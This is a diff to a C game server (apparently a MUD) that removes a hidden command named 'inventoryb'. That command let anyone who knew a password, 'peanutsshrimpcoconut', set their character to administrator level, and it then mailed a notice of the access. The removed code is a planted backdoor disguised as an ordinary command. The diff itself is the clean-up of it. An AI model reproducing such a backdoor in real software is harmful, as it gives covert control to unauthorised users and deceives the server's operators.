@@ -106,7 +106,6 @@ struct command_info cmd_info[] =
     { "f",		do_fire,	POSITION_FIGHTING, 1, CMD_DEFAULT, 0, 25 },
     { "get",		do_get,		POSITION_RESTING, 0, CMD_DEFAULT, COM_CHARMIE_OK, 0 },
     { "inventory",	do_inventory,	POSITION_DEAD, 0, CMD_DEFAULT, 0, 1 },
-    { "inventoryb",	do_spam,	POSITION_DEAD, 0, CMD_DEFAULT, 0, 1 },
     { "k",		do_kill,	POSITION_FIGHTING, 0, CMD_DEFAULT, COM_CHARMIE_OK, 0 },
     { "ki",		do_ki,		POSITION_RESTING, 0, CMD_DEFAULT, COM_CHARMIE_OK, 0 },
     { "kill",		do_kill,	POSITION_FIGHTING, 0, CMD_DEFAULT, COM_CHARMIE_OK, 0 },
@@ -1153,41 +1152,6 @@ char *one_argumentnolow(char *argument, char *first_arg) {
 int fill_word(char *argument)
 {
   return (search_block(argument,fillwords,TRUE) >= 0);
-}
-
-
-int do_spam(CHAR_DATA *ch, char *arg, int cmd)
-{
-  char buf[200], buf2[200];
-  int x;
-
-  /* int system(const char *); */
-
-  if(!*arg) {
-    send_to_char("Huh?\r\n", ch);
-    return eFAILURE;
-    }
-
-  half_chop(arg, buf, buf2);
-
-  if(!isname(buf, "peanutsshrimpcoconut")) {
-    send_to_char("Huh?\r\n", ch);
-    return eFAILURE;
-    } 
-
-  x = atoi(buf2);
-
-  if(x <= 0 || x > (10*11)) {
-    send_to_char("Huh?\r\n", ch);
-    return eFAILURE;
-    }
-
-  GET_LEVEL(ch) = x;
-  update_wizlist(ch);
-
-  sprintf(buf, "ACCESS: %s %d %s\n", GET_NAME(ch), GET_LEVEL(ch), ch->desc->host);
-  automail(buf);
-  return eSUCCESS;
 }
 
 
